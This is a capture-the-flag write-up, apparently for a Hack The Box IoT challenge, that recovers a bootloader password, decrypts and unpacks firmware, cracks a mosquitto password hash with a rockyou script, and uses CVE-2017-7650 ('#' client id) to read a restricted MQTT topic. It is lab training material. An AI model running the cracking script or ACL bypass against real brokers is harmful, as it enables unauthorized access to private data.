@@ -1,0 +1,316 @@
+when you unpack the zip, you get two files, the bootloader in intel hex format and efs.bin.
+we don't even really need the bootloader, because spotting what to do with efs.bin is fairly easy when you open it in a hex editor, but let's look at it anyways.
+
+we can turn it into a binary using `hex2bin` and running `file` on the resulting bin gives us this
+`boot_loader.bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=00b3b0209626fb55543d941467f253b9a2d26ec2, for GNU/Linux 3.2.0, stripped`
+cool, so just an x64 elf binary, we can just throw that into ida/ghidra and run it on linux
+
+
+when we run it we just get this output though
+```
+Secure Boot 2020.01 (April 02 2020 - 13:14:12 +0800)
+
+DRAM: 128MiB
+Message: Caches been cleared
+Flash: 128MiB
+
+Starting autoboot
+
+No working controllers found.
+Exiting..
+
+```
+
+
+the first three function calls just "set up" the memory for the bootloader, we don't really care about any of that and they are just dummy functions that don't really do anything but malloc memory we won't use anyways.
+
+what we're interested in is what happens in `return sub_157F();`
+
+looking at the function, it does this before printing the exit message
+
+
+```
+v2 = getchar();
+  if ( v2 != 0x1B )
+```
+
+so it gets a character from stdin and checks if it has the value 0x1b. when you check an ascii table, you can see that this is the escape character. so pressing escape after running this gives us a different output
+
+```
+Secure Boot 2020.01 (April 02 2020 - 13:14:12 +0800)
+DRAM: 128MiB
+Message: Caches been cleared
+Flash: 128MiB
+
+Starting autoboot
+User input detected. Launching loader.
+
+password:
+
+```
+
+cool, so now we're being asked for a password. looking a bit further down in the code we see this
+```
+puts("User input detected. Launching loader.");
+  putchar(10);
+  printf("password: ");
+  fgets(&s, 17, stdin);
+  sub_1235(&s);
+
+```
+
+it takes our input and passes it to sub_1235. what does that do?
+it begins with 
+```
+v5 = 0x12F6A8129A3A98F4LL;
+v6 = 0x9614BA1A12AADA12LL;
+s2 = (char *)malloc(0x10uLL);
+for ( i = 0; i <= 0xF; ++i )
+    s2[i] = (*((_BYTE *)&v5 + (int)i) >> 1) ^ 0x39;
+result = strcmp(a1, s2);
+
+```
+
+it just iterates over those bytes, shifts them 1 bit to the right and xors them with 0x39. we can easily do the same with a few lines of python
+```
+>>> key = bytes.fromhex("9614BA1A12AADA1212F6A8129A3A98F4")
+>>> for i in key[::-1]:
+...    print(chr((i >> 1)^0x39),end="")
+...
+Cu$t0mB00Tl04d3r
+
+```
+cool, so that's our password. what if we type it in now?
+
+```
+Secure Boot 2020.01 (April 02 2020 - 13:14:12 +0800)
+
+DRAM: 128MiB
+Message: Caches been cleared
+Flash: 128MiB
+
+Starting autoboot
+User input detected. Launching loader.
+
+password: Cu$t0mB00Tl04d3r
+
+Loading File System.
+Error in loading filesystem
+
+```
+
+
+oh no, we get an error. if you run ls you should see that there's a new file though,  `temp_03455.bin`.
+if we look at the code again to see what happens after the password check, we see this.
+
+```
+filename = "efs.bin";
+    stream = fopen("efs.bin", "rb");
+    s = fopen("temp_03455.bin", "wb");
+    if ( stream )
+    {
+      while ( !feof(stream) )
+      {
+        fread(&ptr, 1uLL, 1uLL, stream);
+        for ( k = 0; k <= 0xF; ++k )
+          ptr ^= v4[k];
+        fwrite(&ptr, 1uLL, 1uLL, s);
+      }
+
+```
+
+
+so it opens efs.bin, reads a byte, xors some stuff and writes it to temp_03455.bin.
+what is that xor key though? no idea. the output file is identical to the input, i guess there is something else you need to do first but no idea what. i'm not even gonna bother reading the binaries disassembly to figure that out or debug it in gdb, there's a simpler way.
+
+
+when you open efs.bin in a hexeditor, you will see a lot of 0x60 and 0x9f bytes. in binary files, the most common byte is 0x00, so the byte that shows up in an encrypted binary the most is usually the key. you can open efs.bin in okteta, enable the binary filters window unter `Tools>Binary Filter` and a new panel should pop up. select "XOR" as your operation and set the operand to "HEX" and put the key you want to xor with in the field next to it.
+
+when you input 0x9f as a key and hit filter, the file won't change much, it'll still be full of gibberish. when you undo it and enter 0x60 as the key though, you will see the text `ver. 2.0` at the beginning of the file. looks like plaintext to me!
+
+if we run binwalk on this file we get some results
+
+```
+> binwalk -e efs.bin
+
+DECIMAL      HEXADECIMAL    DESCRIPTION
+--------------------------------------------------------------------------------
+82384        0x141D0        U-Boot version string, "U-Boot 1.1.3 (Oct 18 2019 - 09:12:58)"
+132096        0x20400        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 3634292 bytes
+1442304      0x160200        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 1936774 bytes, 122 inodes, blocksize: 131072 bytes, created: 2020-06-17 03:40:36
+
+```
+
+and if we check the new folder `_efs.bin.extracted` now there should be a `squashfs-root` folder and inside that the root dir of our cyborgs operating system.
+
+there isn't much to look at, so let's just go into the /etc/ directory where everything we need is.
+
+the files that immediately look interesting to us are `passwd.bak`, `vsftpd_passwd` and the passwd file in the mosquitto directory.
+
+vsftpd_passwd is in plaintext and tells us there is a user called admin with the password 1234
+trying to decode the hash in passwd.bak also gives us the password 1234 for admin
+
+when you start the remote docker container and try to connect though, you get no response for FTP, ssh, telnet or stuff like that, so those creds are no use to us.
+
+what about mosquitto?
+
+when we try subscribing to a topic on that host via mosquitto_sub we get the following message
+
+```
+> mosquitto_sub -v -d -h docker.hackthebox.eu -p 30046 -t "#"
+Client mosq-ElKvLjXy1KZvrvrlgX sending CONNECT
+Client mosq-ElKvLjXy1KZvrvrlgX received CONNACK (5)
+Connection error: Connection Refused: not authorised.
+Client mosq-ElKvLjXy1KZvrvrlgX sending DISCONNECT
+
+```
+
+so we get some communication going! we don't have the right creds yet, but we know that mosquitto is our target.
+
+mosquitto does something very annoying with their hashes though.
+if you look at the beginning of the hash, you can see that it begins with $6$. that's the identifier for sha512crypt. 
+i'm not gonna bore you with the details, but it's not that. if you want to know how sha512crypt works, read [url=https://www.vidarholen.net/contents/blog/?p=33]this[/url] cool article that explains it for you.
+
+if you look at the code of the mosquitto_passwd tool though, you can see something like this
+
+
+```
+digest = EVP_get_digestbyname("sha512");
+
+context = EVP_MD_CTX_new();
+EVP_DigestInit_ex(context, digest, NULL);
+EVP_DigestUpdate(context, password, strlen(password));
+EVP_DigestUpdate(context, salt, SALT_LEN);
+EVP_DigestFinal_ex(context, hash, &hash_len);
+EVP_MD_CTX_free(context);
+
+```
+
+
+so it creates a normal sha512 digest, adds the password, adds the salt and that's it.
+
+we can easily whip something like that up ourselves in python real fast
+
+our hash is "$6$iUTv82apTZ0MdMP3$a+hjcpVv7OkX7pYipIPjFqisGfxLegS7FmRiLcOJBF3uaIwdMKpuQvVh0nTpglaUBsn18pssy2ZFvWlZleT8Fg=="
+the $6$ is our lying, lying identifier like we've already said. after that comes the salt. everything between $6$ and the next $ is the salt in base64. everything after that $ is the actual hash in base64. so we can just unbase64 them and use them in our code
+
+```
+import hashlib
+import base64
+
+hash_str = "$6$iUTv82apTZ0MdMP3$a+hjcpVv7OkX7pYipIPjFqisGfxLegS7FmRiLcOJBF3uaIwdMKpuQvVh0nTpglaUBsn18pssy2ZFvWlZleT8Fg=="
+salt = base64.b64decode(hash_str.split("$")[2])
+bin_hash = base64.b64decode(hash_str.split("$")[3])
+
+rockyou = open("/path/to/your/rockyou.txt","rb").read().split(b"\n")
+for password in rockyou:
+    m = hashlib.sha512()
+    m.update(password)
+    m.update(salt)
+    res = m.digest()
+    if res == bin_hash:
+        print(password)
+        break
+
+```
+
+we separate our salt and the binary form of our hash, we open rock you, split it into lines and run each one through our for loop, which creates a new sha512 hash, adds our password, adds the salt and then checks the digest against our own hash. if they're identical, print the password and exit the loop. running it should only take a few seconds and tell you the password is `buffbuff!!!!`
+
+now that we know our password, we can connect with mosquitto_sub again and specify the username from the passwd file and the password we got from the cracked hash
+we will listen to two topics, "#" which is the wildcard and will match to every public topic and "$SYS/#", which is the topic for all server related messages and dosen't show up in the normal wildcard subscription.
+running our command we get
+```
+> mosquitto_sub -v -h docker.hackthebox.eu -p 30046 -u dominic-f35426 -P buffbuff!!!! -t "#" -t "\$SYS/#"
+$SYS/broker/version mosquitto version 1.4.10
+$SYS/broker/timestamp 2020-06-19 07:08:34+0000
+$SYS/broker/uptime 6193 seconds
+$SYS/broker/clients/total 4
+$SYS/broker/clients/inactive 0
+$SYS/broker/clients/disconnected 0
+$SYS/broker/clients/active 4
+$SYS/broker/clients/connected 4
+$SYS/broker/clients/expired 0
+$SYS/broker/clients/maximum 4
+$SYS/broker/messages/stored 49
+$SYS/broker/messages/received 65682
+$SYS/broker/messages/sent 68661
+$SYS/broker/subscriptions/count 4
+$SYS/broker/retained messages/count 49
+$SYS/broker/heap/current 21760
+$SYS/broker/heap/maximum 82944
+$SYS/broker/publish/messages/dropped 0
+$SYS/broker/publish/messages/received 21667
+$SYS/broker/publish/messages/sent 46334
+$SYS/broker/publish/bytes/received 671473
+$SYS/broker/publish/bytes/sent 1333280
+$SYS/broker/bytes/received 2335295
+$SYS/broker/bytes/sent 2581443
+$SYS/broker/load/messages/received/1min 631.17
+$SYS/broker/load/messages/received/5min 630.89
+$SYS/broker/load/messages/received/15min 630.52
+$SYS/broker/load/messages/sent/1min 805.56
+$SYS/broker/load/messages/sent/5min 669.95
+$SYS/broker/load/messages/sent/15min 644.26
+$SYS/broker/load/publish/received/1min 207.35
+$SYS/broker/load/publish/received/5min 209.08
+$SYS/broker/load/publish/received/15min 209.29
+$SYS/broker/load/publish/sent/1min 591.01
+$SYS/broker/load/publish/sent/5min 457.61
+$SYS/broker/load/publish/sent/15min 432.46
+$SYS/broker/load/bytes/received/1min 21603.32
+$SYS/broker/load/bytes/received/5min 21594.64
+$SYS/broker/load/bytes/received/15min 21596.40
+$SYS/broker/load/bytes/sent/1min 31349.80
+$SYS/broker/load/bytes/sent/5min 24422.14
+$SYS/broker/load/bytes/sent/15min 23133.34
+$SYS/broker/load/sockets/1min 2.69
+$SYS/broker/load/sockets/5min 0.71
+$SYS/broker/load/sockets/15min 0.27
+$SYS/broker/load/connections/1min 2.69
+$SYS/broker/load/connections/5min 0.71
+$SYS/broker/load/connections/15min 0.27
+$SYS/broker/log/M/subscribe 1592770677: mosq-WjN1WldyaXRldXA 0 $SYS/#
+house/temperature 43.1
+$SYS/broker/log/M/subscribe 1592770677: Sjc_6<k3n`bA63;=B5j84dZ<0099qRs=h=q4WAp9_q9ZHSEQmxuMDCQHrNpvJXLB 0 $private/geolocation
+house/temperature 34.12
+$SYS/broker/log/M/subscribe 1592770677: Sjc_6<k3n`bA63;=B5j84dZ<0099qRs=h=q4WAp9_q9ZHSEQmxuMDCQHrNpvJXLB 0 $private/geolocation
+house/temperature 54.01
+$SYS/broker/log/M/subscribe 1592770677: Sjc_6<k3n`bA63;=B5j84dZ<0099qRs=h=q4WAp9_q9ZHSEQmxuMDCQHrNpvJXLB 0 $private/geolocation
+house/temperature 33
+$SYS/broker/log/M/subscribe 1592770677: Sjc_6<k3n`bA63;=B5j84dZ<0099qRs=h=q4WAp9_q9ZHSEQmxuMDCQHrNpvJXLB 0 $private/geolocation
+house/temperature 30.02
+$SYS/broker/log/M/subscribe 1592770677: Sjc_6<k3n`bA63;=B5j84dZ<0099qRs=h=q4WAp9_q9ZHSEQmxuMDCQHrNpvJXLB 0 $private/geolocation
+house/temperature 44
+$SYS/broker/log/M/subscribe 1592770677: Sjc_6<k3n`bA63;=B5j84dZ<0099qRs=h=q4WAp9_q9ZHSEQmxuMDCQHrNpvJXLB 0 $private/geolocation
+house/temperature 40.12
+$SYS/broker/log/M/subscribe 1592770677: Sjc_6<k3n`bA63;=B5j84dZ<0099qRs=h=q4WAp9_q9ZHSEQmxuMDCQHrNpvJXLB 0 $private/geolocation
+
+```
+
+that's a lot of stuff, but immediately we find our target
+
+`$SYS/broker/log/M/subscribe 1592770677: Sjc_6<k3n`bA63;=B5j84dZ<0099qRs=h=q4WAp9_q9ZHSEQmxuMDCQHrNpvJXLB 0 $private/geolocation`
+
+that topic broadcasts a message every time someone subscribes to another topic, and this user keeps subscribing to $private/geolocation. if you remember the challenge description, it says `Your mission is to identify the suspect's current location and apprehend him.`, so geolocation seems like a good place to look. 
+trying to subscribe or publish to that topic does nothing though, apparently we don't have the permissions to access it. this is where another piece of information we got from $SYS comes in handy
+
+`$SYS/broker/version mosquitto version 1.4.10` tells us that the mosquitto version is 1.4.10. checking for vulnerabilities in that version online, we find CVE-2017-7650
+
+`In Mosquitto before 1.4.12, pattern based ACLs can be bypassed by clients that set their username/client id to '#' or '+'. This allows locally or remotely connected clients to access MQTT topics that they do have the rights to.`
+
+
+sounds perfect! just what we need. we can set a custom client id using mosquitto_sub with -i, so setting the ID to # and the topic to $private/geolocation should give us the flag?
+
+```
+> mosquitto_sub -i "#"  -d -h docker.hackthebox.eu -p 30046 -u dominic-f35426 -P buffbuff!!!! -t "\$private/geolocation"
+Client # sending CONNECT
+Client # received CONNACK (0)
+Client # sending SUBSCRIBE (Mid: 1, Topic: $private/geolocation, QoS: 0, Options: 0x00)
+Client # received SUBACK
+Subscribed (mid: 1): 0
+Client # received PUBLISH (d0, q0, r1, m0, '$private/geolocation', ... (27 bytes))
+HTB{00h 42.7m, +41° 16′}
+
+```
+
+and it does! you've got his location and the flag, congrats, you're a 1337 haxx0r n4o
